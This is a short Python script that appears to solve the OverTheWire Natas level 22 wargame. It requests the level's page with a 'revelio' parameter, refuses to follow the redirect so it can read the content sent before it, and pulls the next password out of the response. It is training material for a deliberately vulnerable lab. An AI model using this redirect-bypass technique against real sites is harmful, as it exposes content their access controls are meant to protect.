import sys
import requests
import re

def bruteforce_user_password():

    url = "http://natas22.natas.labs.overthewire.org"

    auth=("natas22",sys.argv[1])

    session = requests.Session()

    session.cookies.set("PHPSESSID", "2")

    response = session.get(
        url + "/index.php?revelio",
        auth=auth,
        timeout=10,
        allow_redirects=False)

    if "login as an admin" not in response.text.lower():

        pattern = re.compile(r"Password: [a-zA-z0-9]{32}")
        match = pattern.search(response.text)

        if match:
            print(match.group())

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("[+] Usage python.py <file.py> natas_password")
    bruteforce_user_password()
